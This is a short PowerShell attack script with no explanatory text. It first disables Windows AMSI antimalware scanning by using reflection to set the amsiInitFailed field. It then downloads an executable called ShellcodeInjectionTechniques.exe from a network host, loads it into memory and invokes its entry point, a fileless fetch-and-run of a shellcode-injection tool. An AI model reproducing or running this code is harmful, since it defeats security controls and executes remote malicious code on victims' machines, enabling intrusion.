# AMSI bypass
$a = [Ref].Assembly.GetTypes();ForEach($b in $a) {if ($b.Name -like "*iutils") {$c = $b}};$d = $c.GetFields('NonPublic,Static');ForEach($e in $d) {if ($e.Name -like "*itFailed") {$f = $e}};$f.SetValue($null,$true)

$bytes = (Invoke-WebRequest "http://192.168.1.228/ShellcodeInjectionTechniques.exe").Content;
$assembly = [System.Reflection.Assembly]::Load($bytes);
$entryPointMethod = $assembly.GetType('ShellcodeInjectionTechniques.Program', [Reflection.BindingFlags] 'Public, NonPublic').GetMethod('Main', [Reflection.BindingFlags] 'Static, Public, NonPublic');
$entryPointMethod.Invoke($null, (, [string[]] ('', '')));
